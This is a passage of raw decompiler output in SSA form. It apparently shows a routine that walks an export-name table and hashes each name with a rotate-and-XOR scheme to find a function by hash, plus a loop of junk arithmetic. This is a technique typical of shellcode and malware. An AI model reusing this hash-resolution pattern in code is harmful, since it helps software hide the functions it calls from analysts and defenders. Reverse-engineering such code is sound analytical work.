	if (Mem0[edi_26 + 0x00000018:word32] > 0x00000000)
		while (true)
		{
// dwLoc018E_106 = PHI(dwLoc018E, dwLoc018E_119)
// dwLoc10_107 = PHI(dwLoc10, dwLoc10_142)
// SCZO_108 = PHI(SCZO_48, SCZO_152)
// SO_109 = PHI(SO, SO_153)
// dwLoc08_110 = PHI(dwLoc08_52, dwLoc08_154)
// eax_111 = PHI(eax_45, eax_155)
// esi_112 = PHI(esi_20, esi_145)
			ecx_113 = dwLoc08_110;
			ecx_114 = eax_111[ecx_113 * 0x00000004];
			ecx_115 = ecx_114 + ebx;
			edx_116 = 0x00000000;
			eax_117 = eax_111 & fp - 0x00000004;
			v14_118 = dwLoc018E_106 ^ eax_117;
			dwLoc018E_119 = v14_118;
			SZO_120 = cond(dwLoc018E_119);
			al_121 = Mem0[ecx_115 + 0x00000000:byte];
			eax_122 = DPB(eax_117, al_121, 0, 8);
			SZO_123 = cond(al_121 & al_121);
			Z_124 = SZO_123;
			C_125 = false;
			if ((al_121 & al_121) != 0x00)
				do
				{
// edx_176 = PHI(edx_116, edx_183)
// ecx_177 = PHI(ecx_115, ecx_182)
// al_178 = PHI(al_121, al_184)
					eax_179 = (int32) al_178;
					v17_180 = (edx_176 & 0x20000000) != 0x00000000;
					edx_181 = __rol(edx_176, 0x03);
					ecx_182 = ecx_177 + 0x00000001;
					edx_183 = edx_181 ^ eax_179;
					al_184 = Mem0[ecx_182 + 0x00000000:byte];
					eax_185 = DPB(eax_179, al_184, 0, 8);
					SZO_186 = cond(al_184 & al_184);
					Z_187 = SZO_186;
					C_188 = false;
				} while ((al_184 & al_184) != 0x00);
// Z_126 = PHI(Z_124, Z_187)
// edx_127 = PHI(edx_116, edx_183)
// eax_128 = PHI(eax_122, eax_185)
// al_129 = PHI(al_121, al_184)
// SZO_130 = PHI(SZO_123, SZO_186)
// C_131 = PHI(C_125, C_188)
			ecx_132 = 0x00000312;
			esi_133 = 0x00000052;
			do
			{
// ecx_134 = PHI(ecx_132, ecx_143)
// esi_135 = PHI(esi_133, esi_145)
				eax_136 = 0x00000000 + ecx_134 * 0x00000008;
				eax_137 = eax_136 - ecx_134;
				SCZO_138 = cond(eax_137);
				Z_139 = SCZO_138;
				ecx_140 = eax_137;
				dwLoc10_141 = ecx_140;
				if (eax_137 == 0x00000000)
				{
					ecx_174 = 0x00000002;
					dwLoc10_175 = 0x00000002;
				}
// dwLoc10_142 = PHI(dwLoc10_141, dwLoc10_175)
// ecx_143 = PHI(ecx_140, ecx_174)
				eax_144 = dwLoc10_142;
				esi_145 = esi_135 - 0x00000001;
				SCZO_146 = cond(esi_145);
				Z_147 = SCZO_146;
			} while (esi_145 != 0x00000000);
			SCZO_148 = cond(edx_127 - dwArg04);
			Z_149 = SCZO_148;
			if (edx_127 == dwArg04)
				;
			eax_150 = dwLoc08_110;
			eax_151 = eax_150 + 0x00000001;
			SCZO_152 = cond(eax_151 - Mem0[edi_26 + 0x00000018:word32]);
			SO_153 = SCZO_152;
			dwLoc08_154 = eax_151;
			if (eax_151 >= Mem0[edi_26 + 0x00000018:word32])
				;
			eax_155 = dwLoc18_50;
			al_156 = (byte) eax_155;
		}
	else
	{
// dwLoc018E_79 = PHI(dwLoc018E, dwLoc018E_119)
// dwLoc10_80 = PHI(dwLoc10, dwLoc10_142)
// Z_81 = PHI(Z, Z_149)
// edx_82 = PHI(edx, edx_127)
// ecx_83 = PHI(ecx_47, ecx_143)
// SCZO_84 = PHI(SCZO_48, SCZO_152)
// SO_85 = PHI(SO, SO_153)
// dwLoc08_86 = PHI(dwLoc08_52, dwLoc08_154)
		edi_87 = dwLoc01A4_12;
		esp_88 = fp - 0x000001A0;
		eax_89 = 0x00000000;
		esi_90 = dwLoc01A0_9;
		esp_91 = fp - 0x00000004;
		ebp_92 = dwLoc04_4;
		esp_93 = fp;
	}
}

